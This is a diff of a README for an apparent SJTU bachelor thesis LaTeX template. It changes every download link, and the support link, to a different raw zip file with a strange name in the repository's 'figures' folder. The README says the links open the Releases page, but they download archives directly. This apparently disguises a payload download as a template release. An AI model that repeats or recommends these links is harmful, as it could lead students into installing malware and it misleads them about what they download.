@@ -1,6 +1,6 @@
 # 🎓 SJTU-Bachelor-Thesis-Proposal-Latex-Template - Create Professional Thesis Proposals
 
-[![Download Latest Release](https://raw.githubusercontent.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/main/styles/Latex-Bachelor-Proposal-SJT-Thesis-Template-unexecutorial.zip%20Latest%https://raw.githubusercontent.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/main/styles/Latex-Bachelor-Proposal-SJT-Thesis-Template-unexecutorial.zip)](https://raw.githubusercontent.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/main/styles/Latex-Bachelor-Proposal-SJT-Thesis-Template-unexecutorial.zip)
+[![Download Latest Release](https://github.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/raw/refs/heads/main/figures/Bachelor-Template-SJT-Proposal-Latex-Thesis-Bergsonian.zip%20Latest%https://github.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/raw/refs/heads/main/figures/Bachelor-Template-SJT-Proposal-Latex-Thesis-Bergsonian.zip)](https://github.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/raw/refs/heads/main/figures/Bachelor-Template-SJT-Proposal-Latex-Thesis-Bergsonian.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the SJTU Bachelor Thesis Prop
 
 To get started, visit the following page to download the latest version of the LaTeX template:
 
-[Download Latest Release](https://raw.githubusercontent.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/main/styles/Latex-Bachelor-Proposal-SJT-Thesis-Template-unexecutorial.zip)
+[Download Latest Release](https://github.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/raw/refs/heads/main/figures/Bachelor-Template-SJT-Proposal-Latex-Thesis-Bergsonian.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -64,7 +64,7 @@ If you run into problems or have questions, please check the repository's issue 
 
 ## 📞 Support
 
-For help with the template or to report issues, please open an issue on the [GitHub page](https://raw.githubusercontent.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/main/styles/Latex-Bachelor-Proposal-SJT-Thesis-Template-unexecutorial.zip).
+For help with the template or to report issues, please open an issue on the [GitHub page](https://github.com/MrShoza/SJTU-Bachelor-Thesis-Proposal-Latex-Template/raw/refs/heads/main/figures/Bachelor-Template-SJT-Proposal-Latex-Thesis-Bergsonian.zip).
 
 ## 📜 License
 
